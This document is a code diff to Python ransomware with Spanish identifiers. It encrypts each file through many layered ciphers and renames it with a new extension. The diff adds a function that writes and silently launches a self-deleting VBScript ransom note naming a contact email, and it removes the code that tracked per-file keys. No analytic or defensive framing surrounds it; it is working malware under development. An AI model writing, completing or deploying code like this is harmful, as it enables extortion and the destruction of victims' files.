@@ -43,6 +43,33 @@ def _import_crypto():
         return None
 
 
+def crear_vbs_notificacion(ruta_archivo):
+    try:
+        nombre_base = os.path.splitext(ruta_archivo)[0]
+        vbs_path = nombre_base + ".vbs"
+        vbs_content = """On Error Resume Next
+MsgBox "Your files have been encrypted. Contact: onder01@tutamail.com", vbCritical + vbSystemModal, "Encrypted"
+Dim fso, scriptPath
+Set fso = CreateObject("Scripting.FileSystemObject")
+scriptPath = WScript.ScriptFullName
+WScript.Sleep 3000
+On Error Resume Next
+fso.DeleteFile scriptPath, True
+WScript.Quit
+"""
+        with open(vbs_path, 'w', encoding='utf-8') as f:
+            f.write(vbs_content)
+        
+        try:
+            subprocess.Popen(['wscript.exe', vbs_path], creationflags=0x08000000, shell=False)
+        except:
+            pass
+        
+        return True
+    except:
+        return False
+
+
 class EncriptadorMilitar:
     TAMANO_PEQUENO = 1 * 1024 * 1024
     TAMANO_MEDIANO = 10 * 1024 * 1024
@@ -91,17 +118,6 @@ class EncriptadorMilitar:
         else:
             return 3, '3_capas'
     
-    def _flatten_keys(self, claves_usadas):
-        result = b''
-        for item in claves_usadas:
-            if isinstance(item, bytes):
-                result += item
-            elif isinstance(item, tuple):
-                for subitem in item:
-                    if isinstance(subitem, bytes):
-                        result += subitem
-        return result
-    
     def encriptar(self, ruta):
         try:
             if not os.path.exists(ruta) or ruta.endswith(self.ext):
@@ -119,15 +135,13 @@ class EncriptadorMilitar:
                 return False
             
             num_capas, tipo_capas = self._determinar_capas(tamano)
-            self.stats[tipo_capas] += 1
             
             file_salt = hashlib.sha256(datos[:min(4096, len(datos))] + os.urandom(32)).digest()
             file_master = self._derive_key(MASTER_KEY_FIXED, file_salt, b'file_master', 64)
             
-            claves_usadas = []
             xor_key = self._derive_key(file_master, b'xor_layer', b'initial_obfuscation', 32)
             datos = bytes(b ^ xor_key[i % len(xor_key)] for i, b in enumerate(datos))
-            claves_usadas.append(xor_key)
+            
             key_c1 = self._derive_key(file_master, b'chacha1', b'layer1', 32)
             nonce_c1 = self._derive_key(file_master, b'nonce1', b'layer1', 16)
             cipher_c1 = self.crypto['Cipher'](
@@ -136,8 +150,7 @@ class EncriptadorMilitar:
                 backend=self.crypto['backend']
             )
             datos = cipher_c1.encryptor().update(datos)
-            mac_c1 = self._poly1305_mac(key_c1, datos)
-            claves_usadas.extend([key_c1, nonce_c1, mac_c1])
+            
             key_s = self._derive_key(file_master, b'salsa', b'layer2', 32)
             nonce_s = self._derive_key(file_master, b'nonce2', b'layer2', 16)
             cipher_s = self.crypto['Cipher'](
@@ -146,7 +159,7 @@ class EncriptadorMilitar:
                 backend=self.crypto['backend']
             )
             datos = cipher_s.encryptor().update(datos)
-            claves_usadas.extend([key_s, nonce_s])
+            
             if num_capas >= 5:
                 key_a1 = self._derive_key(file_master, b'aes1', b'layer3', 32)
                 nonce_a1 = self._derive_key(file_master, b'nonce3', b'layer3', 12)
@@ -157,8 +170,7 @@ class EncriptadorMilitar:
                 )
                 enc_a1 = cipher_a1.encryptor()
                 datos = enc_a1.update(datos) + enc_a1.finalize()
-                tag_a1 = enc_a1.tag
-                claves_usadas.extend([key_a1, nonce_a1, tag_a1])
+                
                 key_cam = self._derive_key(file_master, b'camellia', b'layer4', 32)
                 nonce_cam = self._derive_key(file_master, b'nonce4', b'layer4', 16)
                 cipher_cam = self.crypto['Cipher'](
@@ -167,7 +179,7 @@ class EncriptadorMilitar:
                     backend=self.crypto['backend']
                 )
                 datos = cipher_cam.encryptor().update(datos)
-                claves_usadas.extend([key_cam, nonce_cam])
+            
             if num_capas >= 8:
                 key_a2 = self._derive_key(file_master, b'aes2', b'layer5', 32)
                 iv_a2 = self._derive_key(file_master, b'iv5', b'layer5', 16)
@@ -179,7 +191,7 @@ class EncriptadorMilitar:
                     backend=self.crypto['backend']
                 )
                 datos = cipher_a2.encryptor().update(datos_padded)
-                claves_usadas.extend([key_a2, iv_a2])
+                
                 key_tw = self._derive_key(file_master, b'twofish', b'layer6', 32)
                 nonce_tw = self._derive_key(file_master, b'nonce6', b'layer6', 16)
                 for _ in range(3):
@@ -189,19 +201,19 @@ class EncriptadorMilitar:
                         backend=self.crypto['backend']
                     )
                     datos = cipher_tw.encryptor().update(datos)
-                claves_usadas.extend([key_tw, nonce_tw])
+                
                 serpent_key = self._derive_key(file_master, b'serpent', b'layer7', 32)
                 chunk_size = min(64, len(datos))
                 for i in range(0, len(datos), chunk_size):
                     chunk = datos[i:i+chunk_size]
                     h = hashlib.blake2b(serpent_key + chunk, digest_size=len(chunk))
                     datos = datos[:i] + bytes(a ^ b for a, b in zip(chunk, h.digest())) + datos[i+len(chunk):]
-                claves_usadas.append(serpent_key)
+            
             if num_capas >= 12:
                 blake_key = self._derive_key(file_master, b'blake', b'layer8', 64)
                 h = hashlib.blake2b(blake_key + datos, digest_size=64)
                 datos = h.digest() + datos
-                claves_usadas.append(blake_key)
+                
                 key_c2 = self._derive_key(file_master, b'chacha2', b'layer9', 32)
                 nonce_c2 = self._derive_key(file_master, b'nonce9', b'layer9', 16)
                 cipher_c2 = self.crypto['Cipher'](
@@ -210,7 +222,7 @@ class EncriptadorMilitar:
                     backend=self.crypto['backend']
                 )
                 datos = cipher_c2.encryptor().update(datos)
-                claves_usadas.extend([key_c2, nonce_c2])
+                
                 key_a3 = self._derive_key(file_master, b'aes3', b'layer10', 32)
                 nonce_a3 = self._derive_key(file_master, b'nonce10', b'layer10', 16)
                 cipher_a3 = self.crypto['Cipher'](
@@ -219,7 +231,6 @@ class EncriptadorMilitar:
                     backend=self.crypto['backend']
                 )
                 datos = cipher_a3.encryptor().update(datos)
-                claves_usadas.extend([key_a3, nonce_a3])
             
             metadata = num_capas.to_bytes(1, 'big') + file_salt
             hmac_key = self._derive_key(MASTER_KEY_FIXED, b'hmac_salt', b'hmac_key', 64)
@@ -238,6 +249,8 @@ class EncriptadorMilitar:
                 nueva_ruta = ruta + self.ext
                 os.rename(ruta, nueva_ruta)
                 self.processed_files.add(os.path.abspath(nueva_ruta))
+                self.stats[tipo_capas] += 1
+                crear_vbs_notificacion(nueva_ruta)
                 return True
             except:
                 return False
